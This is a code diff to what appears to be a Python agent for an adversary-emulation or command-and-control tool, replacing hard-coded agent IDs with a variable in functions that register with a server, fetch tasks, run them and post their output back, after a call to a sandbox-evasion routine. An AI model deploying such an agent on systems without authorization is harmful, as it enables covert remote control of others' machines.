@@ -64,8 +64,7 @@ def get_platform():
 
 def register():
     url = 'http://localhost:8000/register_agent'
-    computer_name = execute_command('hostname')
-    req = http.request('POST', url, fields={'id': 8, 'host_name': 'more'}, headers=headers)
+    req = http.request('POST', url, fields={'id': agent_id, 'host_name': 'more'}, headers=headers)
     response = str(req.data.decode('utf-8'))
     print('Response code: ' + str(req.status))
     print('Response: ' + response)
@@ -91,7 +90,7 @@ def get_techniques():
 def download_and_run_commands():
     results = []
 
-    url = 'http://localhost:8000/agent_tasks/5'
+    url = ('http://localhost:8000/agent_tasks/%s' % agent_id)
 
     req = http.request('GET', url, headers=headers)
     response = str(req.data.decode('utf-8'))
@@ -124,7 +123,7 @@ def send_output():
     for i, res in enumerate(agent_tech):
         # try:
         # time.sleep(1)
-        req = http.request('POST', url, fields={'id': 5, 'tech': agent_tech[i], 'output': std_out[i],
+        req = http.request('POST', url, fields={'id': agent_id, 'tech': agent_tech[i], 'output': std_out[i],
                                                 'executed': ('%s' % executed[i])}, headers=headers)
         print('Response code: ' + str(req.status))
         # time.sleep(4)
@@ -170,9 +169,9 @@ if __name__ == '__main__':
     print('Agent running')
     sandbox_evasion()
     config_file()
-    print(agent_id)
-    techs = get_techniques()
-    print(techs)
+    # print(agent_id)
+    # techs = get_techniques()
+    # print(techs)
     # results = download_and_run_commands()
     # print(results)
 
